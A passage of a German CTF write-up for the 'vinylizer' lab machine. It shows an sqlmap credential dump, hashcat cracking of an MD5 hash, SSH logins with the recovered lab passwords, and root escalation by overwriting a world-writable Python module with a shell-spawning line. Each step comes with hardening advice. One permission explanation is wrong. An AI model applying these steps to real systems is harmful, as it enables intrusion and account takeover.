+[23:14:58] [WARNING] no clear password(s) found
+Database: vinyl_marketplace
+Table: users
+[2 entries]
++----+----------------------------------+-----------+----------------+
+| id | password                         | username  | login_attempts |
++----+----------------------------------+-----------+----------------+
+| 1  | <span class="password">9432522ed1a8fca612b11c3980a031f6</span> | shopadmin | 0              |
+| 2  | <span class="password">password123</span>                      | lana      | 0              |
++----+----------------------------------+-----------+----------------+
+
+[23:14:58] [INFO] table 'vinyl_marketplace.users' dumped to CSV file '/root/.local/share/sqlmap/output/vinylizer.hmv/dump/vinyl_marketplace/users.csv'
+[23:14:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/vinylizer.hmv'
+
+[*] ending @ 23:14:58 /2024-04-29/
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser `sqlmap`-Befehl zielt darauf ab, den Inhalt der Tabelle `users` auszulesen.
+                <ul>
+                    <li>`-T users`: Gibt die Zieltabelle an.</li>
+                    <li>`--dump`: Weist `sqlmap` an, den gesamten Inhalt der angegebenen Tabelle(n) abzurufen und anzuzeigen.</li>
+                </ul>
+            `sqlmap` identifiziert die Spalten (`id`, `login_attempts`, `password`, `username`) und extrahiert zwei Einträge:
+                <ol>
+                    <li>Benutzer `shopadmin` mit dem Passwort-Hash `<span class="password">9432522ed1a8fca612b11c3980a031f6</span>`.</li>
+                    <li>Benutzer `lana` mit dem Klartextpasswort `<span class="password">password123</span>`.</li>
+                </ol>
+            `sqlmap` erkennt den Wert in der Passwortspalte für `shopadmin` als potenziellen Hash und bietet an, ihn zu knacken. Der interne Cracking-Versuch mit der Standard-Wortliste schlägt jedoch fehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist der Durchbruch für den Initial Access! Wir haben Benutzernamen und zugehörige Passwörter/Hashes erhalten. Der Benutzer `lana` hat ein schwaches Klartextpasswort (`password123`). Der Benutzer `shopadmin` hat ein gehashtes Passwort, das mit einem externen Tool wie `hashcat` und einer besseren Wortliste geknackt werden könnte. `sqlmap` identifiziert den Hash korrekt als MD5 (`md5_generic_passwd`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche sofort, dich per SSH mit den Zugangsdaten `lana`:`password123` anzumelden. Kopiere den Hash für `shopadmin` (`<span class="password">9432522ed1a8fca612b11c3980a031f6</span>`) und versuche, ihn offline mit `hashcat` und einer umfangreichen Wortliste (z.B. `rockyou.txt`) zu knacken.
+            <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Neben der Behebung der SQL-Injection müssen die kompromittierten Passwörter sofort geändert werden. Implementieren Sie eine Richtlinie für starke Passwörter. Speichern Sie Passwörter niemals im Klartext! Verwenden Sie starke, gesalzene Hashing-Algorithmen (z.B. Argon2, bcrypt, scrypt). Überprüfen Sie, welche Berechtigungen die Benutzer `lana` und `shopadmin` auf dem System haben.</p>
+
+           <div class="code-block">
+               <div class="terminal">
+                   <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh lana@vinylizer.hmv</span></div>
+                   <pre>
+The authenticity of host 'vinylizer.hmv (192.168.2.113)' can't be established.
+ED25519 key fingerprint is SHA256:yCfkg1nIMY5Js54ufG7vp1HRTJNGmXQNbHUhTo1FyaE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'vinylizer.hmv' (ED25519) to the list of known hosts.
+lana@vinylizer.hmv's password: <span class="password">password123</span>
+Permission denied, please try again.
+lana@vinylizer.hmv's password:
+                   </pre>
+               </div>
+           </div>
+           <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine SSH-Verbindung zum Zielsystem `vinylizer.hmv` (192.168.2.113) als Benutzer `lana` mit dem zuvor gefundenen Passwort `<span class="password">password123</span>` herzustellen. Der erste Verbindungsversuch erfordert die Bestätigung des Host-Schlüssels.</p>
+           <p class="evaluation"><strong>Bewertung:</strong> Der Login-Versuch mit `lana`:`password123` schlägt fehl ("Permission denied"). Dies könnte mehrere Gründe haben: Das Passwort wurde seit dem Dump geändert, der Benutzer `lana` darf sich nicht per SSH anmelden (z.B. Konfiguration in `/etc/ssh/sshd_config`), oder das Passwort aus der Datenbank gilt nicht für den SSH-Login (z.B. unterschiedliche Authentifizierungssysteme).</p>
+           <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der Login mit `lana` fehlschlug, konzentriere dich auf das Knacken des Hashes für den Benutzer `shopadmin`. Versuche nicht zu viele SSH-Logins, um eine mögliche Sperrung durch Tools wie `fail2ban` zu vermeiden.
+           <br><strong>Empfehlung (Admin):</strong> Untersuchen Sie, warum der Login für `lana` fehlschlug, falls dieser Benutzer legitimen SSH-Zugriff haben sollte. Stellen Sie sicher, dass nur autorisierte Benutzer SSH-Zugriff haben (`AllowUsers` oder `AllowGroups` in `sshd_config`). Überwachen Sie fehlgeschlagene SSH-Login-Versuche.</p>
+
+            <!-- Hinweis: Der Metasploit-Block wurde aus dem Rohtext entfernt, da er nicht ausgeführt wurde und keinen Kontext lieferte. Falls dieser relevant war, bitte erneut bereitstellen. -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hashcat -a 0 -m 0 "9432522ed1a8fca612b11c3980a031f6" /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+hashcat (v6.2.6) starting
+
+[...]
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 4 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344491
+* Bytes.....: 139923145
+* Keyspace..: 14344484
+* Runtime...: 1 sec
+
+<span class="password">9432522ed1a8fca612b11c3980a031f6</span>:<span class="password">addicted2vinyl</span>
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: MD5
+Hash.Target......: <span class="password">9432522ed1a8fca612b11c3980a031f6</span>
+Time.Started.....: Mon Apr 29 23:20:01 2024 (0 secs)
+Time.Estimated...: Mon Apr 29 23:20:01 2024 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#*.........: [...] kH/s ([...]) @ Accel:128 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 1333632/14344484 (9.30%)
+Rejected.........: 0/1333632 (0.00%)
+Restore.Point....: 1320960/14344484 (9.21%)
+Restore.Sub.#*...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#*....: iloveyou -> anabel15
+Hardware.Mon.#*..: Temp: 58c Fan: 30% Util: 50% Core:1607MHz Mem:3004MHz Bus:16
+
+Started: Mon Apr 29 23:19:59 2024
+Stopped: Mon Apr 29 23:20:02 2024
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `hashcat` ist ein leistungsstarkes Werkzeug zum Knacken von Passworthashes.
+                <ul>
+                    <li>`-a 0`: Wählt den Angriffsmodus 0 (Wörterbuchangriff).</li>
+                    <li>`-m 0`: Gibt den Hash-Typ an (0 steht für MD5).</li>
+                    <li>`"9432522ed1a8fca612b11c3980a031f6"`: Der zu knackende MD5-Hash des Benutzers `shopadmin`.</li>
+                    <li>`/usr/share/wordlists/rockyou.txt`: Die verwendete Wörterbuchdatei. `rockyou.txt` ist eine sehr bekannte und oft erfolgreiche Liste von kompromittierten Passwörtern.</li>
+                </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! `hashcat` konnte den MD5-Hash erfolgreich knacken. Das zugehörige Passwort für den Benutzer `shopadmin` lautet `<span class="password">addicted2vinyl</span>`. Dies liefert uns gültige Zugangsdaten für den SSH-Dienst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die nun bekannten Zugangsdaten `shopadmin`:`<span class="password">addicted2vinyl</span>`, um sich per SSH am Zielsystem anzumelden.
+            <br><strong>Empfehlung (Admin):</strong> Die Verwendung von MD5 zum Hashen von Passwörtern ist extrem unsicher und veraltet, da es sehr schnell geknackt werden kann. Migrieren Sie sofort zu einem modernen, starken, gesalzenen Hashing-Algorithmus (Argon2, bcrypt, scrypt). Erzwingen Sie die Verwendung starker, nicht im Wörterbuch enthaltener Passwörter.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh shopadmin@vinylizer.hmv</span></div>
+                    <pre>
+shopadmin@vinylizer.hmv's password: <span class="password">addicted2vinyl</span>
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Apr 29 09:38:16 PM UTC 2024
+
+  System load:             0.03564453125
+  Usage of /:              60.8% of 11.21GB
+  Memory usage:            54%
+  Swap usage:              0%
+  Processes:               125
+  Users logged in:         0
+  IPv4 address for enp0s3: 192.168.2.113
+  IPv6 address for enp0s3: 2003:d4:c73e:eb63:a00:27ff:fe6d:ec17
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+49 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sat Jan 20 14:59:07 2024 from 10.0.2.15
+
+shopadmin@vinylizer:~$
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine SSH-Verbindung als Benutzer `shopadmin` mit dem zuvor geknackten Passwort `<span class="password">addicted2vinyl</span>` herzustellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, der Login war erfolgreich! Wir haben nun eine interaktive Shell auf dem Zielsystem als Benutzer `shopadmin`. Die Willkommensnachricht (Message of the Day, MOTD) liefert zusätzliche Systeminformationen (Ubuntu 22.04.3 LTS, Kernel-Version, IP-Adressen, Systemauslastung, verfügbare Updates). Dies markiert den erfolgreichen Abschluss der Initial-Access-Phase.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der lokalen Enumeration auf dem Zielsystem. Suchen Sie nach Benutzerrechten (`id`, `sudo -l`), interessanten Dateien im Home-Verzeichnis (`ls -la`), laufenden Prozessen (`ps aux`), Netzwerkverbindungen (`netstat -tulnp`) und potenziellen Wegen zur Privilege Escalation.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Berechtigungen des Benutzers `shopadmin`. Ändern Sie das kompromittierte Passwort. Aktualisieren Sie das System, um die angezeigten Sicherheitslücken zu schließen (`apt update && apt upgrade`). Überprüfen Sie die SSH-Konfiguration und Logs.</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Privilege Escalation Path)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Nach dem erfolgreichen initialen Zugriff als Benutzer `shopadmin` ist das nächste Ziel die Eskalation der Berechtigungen auf `root`-Ebene. Die `sudo -l`-Ausgabe zeigt einen potenziellen Weg auf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `shopadmin` darf das Python-Skript `/opt/vinylizer.py` mittels `sudo` ohne Passwortabfrage als jeder Benutzer (`ALL : ALL`), implizit auch als `root`, ausführen. Dies ist ein häufiger, aber gefährlicher Konfigurationsfehler. Wenn dieses Skript manipuliert werden kann oder selbst Schwachstellen aufweist, die eine Codeausführung ermöglichen, kann dies zur vollständigen Übernahme des Systems führen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche das Skript `/opt/vinylizer.py` genau. Prüfe die Dateiberechtigungen des Skripts selbst und aller Module, die es importiert. Wenn das Skript oder eines seiner importierten Module für den Benutzer `shopadmin` schreibbar ist, kann Code injiziert werden, der dann mit `root`-Rechten ausgeführt wird.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die `sudoers`-Konfiguration sorgfältig. Vermeiden Sie es, Benutzern zu erlauben, Skripte mit `sudo` auszuführen, insbesondere wenn diese oder ihre Abhängigkeiten schreibbar sind. Wenn ein Skript mit erhöhten Rechten ausgeführt werden muss, stellen Sie sicher, dass es sicher programmiert ist und seine Berechtigungen sowie die seiner Abhängigkeiten korrekt gesetzt sind (nicht schreibbar für unprivilegierte Benutzer). Beschränken Sie `sudo`-Rechte auf die absolut notwendigen Befehle und Benutzer.</p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">shopadmin@vinylizer:~$ <span class="command">ll</span></div>
+                    <pre>
+total 36
+drwxr-x--- 3 shopadmin shopadmin 4096 Jan 20 15:14 ./
+drwxr-xr-x 4 root      root      4096 Jan 20 14:54 ../
+-rw------- 1 shopadmin shopadmin   80 Jan 20 15:14 .bash_history
+-rw-r--r-- 1 shopadmin shopadmin  220 Jan 20 14:54 .bash_logout
+-rw-r--r-- 1 shopadmin shopadmin 3771 Jan 20 14:54 .bashrc
+drwx------ 2 shopadmin shopadmin 4096 Jan 20 14:59 .cache/
+-rw-r--r-- 1 shopadmin shopadmin  807 Jan 20 14:54 .profile
+-rw-rw-r-- 1 shopadmin shopadmin   14 Jan 20 14:59 user.txt
+-rw------- 1 shopadmin shopadmin  734 Jan 20 14:59 .viminfo
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `ll` (ein Alias für `ls -l` oder `ls -al` je nach Konfiguration) listet den Inhalt des aktuellen Verzeichnisses (das Home-Verzeichnis von `shopadmin`) im langen Format auf, inklusive Berechtigungen, Eigentümer, Größe und Änderungsdatum.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Auflistung zeigt Standard-Konfigurationsdateien (`.bashrc`, `.profile`) und eine interessante Datei namens `user.txt`. Die Berechtigungen `-rw-rw-r--` für `user.txt` bedeuten, dass der Eigentümer (`shopadmin`) und die Gruppe (`shopadmin`) Lese- und Schreibzugriff haben, während andere nur Lesezugriff haben. Dies ist die erste Flagge.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von `user.txt` (`cat user.txt`). Untersuchen Sie die anderen Dateien auf sensible Informationen, obwohl die meisten Standard-Shell-Konfigurationsdateien sind. Fahren Sie mit der Überprüfung der `sudo`-Rechte fort.
+             <br><strong>Empfehlung (Admin):</strong> Flags oder sensible Informationen sollten nicht mit unsicheren Berechtigungen im Home-Verzeichnis liegen. Wenn `user.txt` eine Flagge für eine CTF-Box ist, ist dies erwartet, aber in einer Produktionsumgebung wäre dies ein Problem. Stellen Sie sicher, dass sensible Daten angemessen geschützt sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">shopadmin@vinylizer:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for shopadmin on vinylizer:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User shopadmin may run the following commands on vinylizer:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` listet die Befehle auf, die der aktuelle Benutzer (`shopadmin`) mit `sudo` (also mit erhöhten Rechten, standardmäßig als `root`) ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Schlüssel zur Privilege Escalation! Die Ausgabe bestätigt, dass `shopadmin` den Befehl `/usr/bin/python3 /opt/vinylizer.py` als jeder Benutzer (`ALL : ALL`) und ohne erneute Passworteingabe (`NOPASSWD`) ausführen darf. Wenn wir einen Weg finden, durch die Ausführung dieses Python-Skripts beliebigen Code einzuschleusen, können wir `root`-Rechte erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Skript `/opt/vinylizer.py`. Analysieren Sie dessen Code auf Schwachstellen. Prüfen Sie insbesondere, welche Module importiert werden und ob diese Module oder das Skript selbst vom Benutzer `shopadmin` beschreibbar sind.
+            <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Diese `sudo`-Regel ist extrem gefährlich. Erlauben Sie niemals `NOPASSWD` für Befehle, die eine Shell-Flucht oder beliebige Codeausführung ermöglichen könnten. Beschränken Sie `sudo`-Rechte auf spezifische, absolut notwendige Befehle und vermeiden Sie das Ausführen von Skripten auf diese Weise. Wenn Skripte nötig sind, stellen Sie sicher, dass weder das Skript noch seine Abhängigkeiten von unprivilegierten Benutzern modifiziert werden können.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">shopadmin@vinylizer:~$ <span class="command">sudo -u root /usr/bin/python3 /opt/vinylizer.py</span></div>
+                     <pre>
+o      '                  o
+       o o                 o
+o                        o
+o       o
+      '   'oo.    o o    oo .oo. `oo.
+`o    o   o   o    o      o    o  oo'  o
+ `o            o    o o
+  `o'     o'  o    `o o o' oo `o'  o
+By: MrMidnight          o
+                     o'
+
+Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : !bash
+Invalid Input!
+Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : L
+No albums available.
+
+Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : L
+No albums available.
+
+Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : A
+
+Enter the name of the new album: benhacker
+Enter the number of sides for the new album: 12
+Album 'benhacker' with 12 sides added successfully.
+
+Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : Q
+
+Quitting Vinylizer.
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Python-Skript `/opt/vinylizer.py` wird mit `sudo -u root` ausgeführt, um seine Funktionalität zu testen. Das Skript präsentiert ein Menü zur Verwaltung von Vinylalben. Es wird versucht, durch Eingabe von `!bash` eine Shell zu starten, was jedoch fehlschlägt ("Invalid Input!"). Anschließend werden die Optionen 'L' (List) und 'A' (Add) getestet, bevor das Skript mit 'Q' (Quit) beendet wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Skript scheint keine direkte Funktion zur Shell-Ausführung zu haben. Es interagiert jedoch mit dem Dateisystem (zumindest zum Speichern/Laden von Alben, was hier nicht vollständig sichtbar ist) und nimmt Benutzereingaben entgegen. Die eigentliche Schwachstelle liegt wahrscheinlich nicht im sichtbaren Code des Skripts, sondern in den Modulen, die es importiert, oder in unsicheren Dateiberechtigungen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode von `/opt/vinylizer.py`, falls lesbar. Wenn nicht, untersuchen Sie, welche Python-Module von diesem Skript importiert werden. Prüfen Sie die Dateiberechtigungen dieser Module.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte, die mit erhöhten Rechten ausgeführt werden, keine unsicheren Eingaben verarbeiten oder externe Befehle auf unsichere Weise aufrufen. Der Fokus sollte weiterhin auf der Absicherung der `sudo`-Regel und der Dateiberechtigungen liegen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">shopadmin@vinylizer:~$ <span class="command">python3</span></div>
+                    <pre>
+Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import json; import random; json; random
+<module 'json' from '/usr/lib/python3.10/json/__init__.py'>
+<module 'random' from '/usr/lib/python3.10/random.py'>
+>>> exit()
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Python3-Interpreter wird gestartet. Es wird versucht, die Module `json` und `random` zu importieren. Python zeigt daraufhin die Pfade zu den jeweiligen Moduldateien an (`/usr/lib/python3.10/json/__init__.py` und `/usr/lib/python3.10/random.py`). Dies dient dazu herauszufinden, welche Standardmodule potenziell vom Skript `/opt/vinylizer.py` verwendet werden könnten und wo sich deren Dateien befinden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist eine clevere Methode zur Enumeration. Indem man häufig verwendete Standardmodule importiert, kann man deren Speicherorte ermitteln, ohne den Quellcode des Zielskripts (`/opt/vinylizer.py`) direkt analysieren zu müssen (falls dieser nicht lesbar ist). Die Pfade `/usr/lib/python3.10/json/__init__.py` und `/usr/lib/python3.10/random.py` sind nun bekannt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Dateiberechtigungen der identifizierten Moduldateien (`/usr/lib/python3.10/json/__init__.py` und `/usr/lib/python3.10/random.py`) mit `ls -l`. Wenn eine dieser Dateien für den Benutzer `shopadmin` schreibbar ist, kann sie durch bösartigen Code ersetzt werden.
+             <br><strong>Empfehlung (Admin):</strong> Standard-Bibliotheksdateien von Programmiersprachen sollten niemals für normale Benutzer schreibbar sein. Überprüfen und korrigieren Sie die Berechtigungen im Verzeichnis `/usr/lib/python3.10/` und anderen Bibliotheksverzeichnissen, um sicherzustellen, dass nur `root` Schreibzugriff hat.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">shopadmin@vinylizer:~$ <span class="command">ll /usr/lib/python3.10/random.py</span></div>
+                     <pre>
+-rwxrwxrwx 1 root root 33221 Nov 20 15:14 /usr/lib/python3.10/random.py*
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen der Datei `/usr/lib/python3.10/random.py` werden überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Schwachstelle gefunden!** Die Datei hat die Berechtigungen `-rwxrwxrwx`. Das bedeutet, sie ist für jeden Benutzer auf dem System lesbar, schreibbar und ausführbar ("world-writable"). Da das Skript `/opt/vinylizer.py` wahrscheinlich das Standardmodul `random` importiert und mit `sudo` als `root` ausgeführt wird, können wir die Datei `/usr/lib/python3.10/random.py` mit unserem eigenen Code überschreiben. Wenn `/opt/vinylizer.py` das nächste Mal ausgeführt wird, wird unser Code anstelle des originalen `random`-Moduls geladen und mit `root`-Rechten ausgeführt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ersetzen Sie den Inhalt von `/usr/lib/python3.10/random.py` mit Code, der eine Reverse Shell oder eine lokale Shell startet (z.B. `import pty; pty.spawn("/bin/bash")`). Führen Sie anschließend `/opt/vinylizer.py` erneut mit `sudo` aus.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Korrigieren Sie sofort die Berechtigungen dieser Datei. Standardmäßig sollten Python-Bibliotheksdateien nur für `root` schreibbar sein (z.B. `-rw-r--r--`). Führen Sie eine systemweite Überprüfung auf andere "world-writable"-Dateien durch, insbesondere in Systemverzeichnissen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">shopadmin@vinylizer:~$ <span class="command">ll /usr/lib/python3.10/json/__init__.py</span></div>
+                     <pre>
+-rw-r--r-- 1 root root 14020 Nov 20 15:14 /usr/lib/python3.10/json/__init__.py
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen der Datei `/usr/lib/python3.10/json/__init__.py` werden überprüft.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Berechtigungen `-rw-r--r--` sind korrekt. Die Datei ist nur für den Eigentümer (`root`) schreibbar. Diese Datei kann nicht für die Privilege Escalation missbraucht werden.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren Sie diese Datei für den aktuellen Angriffspfad und konzentrieren Sie sich auf die schreibbare `random.py`.
+              <br><strong>Empfehlung (Admin):</strong> Diese Berechtigungen sind korrekt und dienen als Beispiel dafür, wie Systemdateien geschützt sein sollten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">shopadmin@vinylizer:~$ <span class="command">echo 'import pty;pty.spawn("/bin/bash")' > /usr/lib/python3.10/random.py</span></div>
+                    <!-- Keine Ausgabe bei erfolgreicher Ausführung -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `echo` wird verwendet, um den String `import pty;pty.spawn("/bin/bash")` in die Datei `/usr/lib/python3.10/random.py` zu schreiben. Die Umleitung `>` überschreibt den bisherigen Inhalt der Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Exploit-Schritt. Der ursprüngliche Inhalt des `random`-Moduls wird durch eine einzige Zeile Python-Code ersetzt. Dieser Code importiert das `pty`-Modul (Pseudo-Terminal Utilities) und verwendet dessen `spawn`-Funktion, um eine interaktive `/bin/bash`-Shell zu starten, sobald dieses "modifizierte" Modul importiert wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nun den `sudo`-Befehl aus, der das Skript `/opt/vinylizer.py` startet. Da dieses Skript vermutlich das `random`-Modul importiert, sollte der eingeschleuste Code ausgeführt werden und eine `root`-Shell starten.
+            <br><strong>Empfehlung (Admin):</strong> Dies zeigt die Gefahr von unsicheren Dateiberechtigungen. Nachdem die Berechtigungen korrigiert wurden, stellen Sie sicher, dass keine kompromittierten Versionen von Systemdateien zurückbleiben. Ein Intrusion Detection System (IDS) oder File Integrity Monitoring (FIM) könnte solche Änderungen erkennen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">shopadmin@vinylizer:~$ <span class="command">sudo -u root /usr/bin/python3 /opt/vinylizer.py</span></div>
+                    <pre>
+root@vinylizer:/home/shopadmin#
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Skript `/opt/vinylizer.py` wird erneut mit `sudo -u root` ausgeführt. Da die Datei `/usr/lib/python3.10/random.py`, die von diesem Skript wahrscheinlich importiert wird, zuvor mit dem Shell-spawning Code überschrieben wurde, wird dieser Code nun ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, die Privilege Escalation war erfolgreich! Statt der normalen Ausgabe des Vinylizer-Skripts erhalten wir direkt einen Shell-Prompt (`root@vinylizer:/home/shopadmin#`). Der Prompt zeigt `root` als Benutzer an. Wir haben unser Ziel erreicht und vollständige Kontrolle über das System erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigen Sie die Identität mit `id` oder `whoami`. Suchen Sie nach der finalen Root-Flagge (oft in `/root`). Führen Sie weitere Post-Exploitation-Schritte durch, falls erforderlich (z.B. Persistenz einrichten, Netzwerk weiter scannen). Bereinigen Sie die manipulierte Datei (`/usr/lib/python3.10/random.py`), um das System nicht dauerhaft zu beschädigen (obwohl dies in CTFs oft nicht nötig ist).
+            <br><strong>Empfehlung (Admin):</strong> Nachdem die Berechtigungen korrigiert und das System bereinigt wurde, analysieren Sie die Logs, um den Angriffsverlauf nachzuvollziehen. Überprüfen Sie die `sudoers`-Datei gründlich und härten Sie die Systemkonfiguration, um ähnliche Angriffe in Zukunft zu verhindern.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@vinylizer:/home/shopadmin# <span class="command">cd ~</span></div>
+                     <!-- Keine Ausgabe, Wechsel ins Home-Verzeichnis von root -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `cd ~` wechselt in das Home-Verzeichnis des aktuellen Benutzers. Da wir als `root` angemeldet sind, wechseln wir nach `/root`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein einfacher Navigationsschritt, um zum erwarteten Speicherort der Root-Flagge zu gelangen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Listen Sie den Inhalt des `/root`-Verzeichnisses auf (`ls -la`), um die Root-Flagge zu finden.
+             <br><strong>Empfehlung (Admin):</strong> Standard-Administrationsaufgabe. Keine spezifische Sicherheitsempfehlung hier.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@vinylizer:~# <span class="command">ls -la</span></div>
+                     <pre>
+total 36
+drwx------  5 root root 4096 Jan 20 15:14 .
+drwxr-xr-x 19 root root 4096 Jan 20 13:46 ..
+-rw-------  1 root root  181 Jan 20 15:14 .bash_history
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  2 root root 4096 Jan 20 14:01 .cache
+drwxr-xr-x  3 root root 4096 Jan 20 14:56 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r--r--  1 root root   11 Jan 20 14:59 root.txt
+drwx------  3 root root 4096 Jan 20 13:51 snap
+                     </pre>
+                     <!-- Hinweis: Prompt wurde von root@vinylizer:/home/shopadmin# zu root@vinylizer:~# angepasst, da cd ~ ausgeführt wurde -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Befehl `ls -la` listet alle Dateien (auch versteckte) im aktuellen Verzeichnis (`/root`) im langen Format auf.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt die erwartete Datei `root.txt`. Sie hat die Berechtigungen `-rw-r--r--`, was bedeutet, dass nur `root` sie lesen und schreiben kann.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von `root.txt` mit `cat root.txt`.
